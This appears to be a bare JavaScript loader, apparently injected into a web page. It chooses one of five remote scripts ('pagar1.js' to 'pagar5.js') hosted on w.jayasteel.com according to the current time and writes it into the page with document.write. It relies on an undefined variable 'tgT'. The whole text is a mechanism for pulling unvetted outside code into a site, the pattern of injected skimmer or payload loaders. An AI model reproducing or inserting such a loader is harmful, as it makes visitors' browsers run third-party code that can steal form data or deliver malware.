var u = [
  "<script src='https://w.jayasteel.com/pagar1.js' type='text/javascript'></script>",
  "<script src='https://w.jayasteel.com/pagar2.js' type='text/javascript'></script>",
  "<script src='https://w.jayasteel.com/pagar3.js' type='text/javascript'></script>",
  "<script src='https://w.jayasteel.com/pagar4.js' type='text/javascript'></script>",
  "<script src='https://w.jayasteel.com/pagar5.js' type='text/javascript'></script>"
];
var e = Math.floor((Math.abs(new Date().getTime() - tgT) / 92e6) % u.length);
document.write(u[e]);
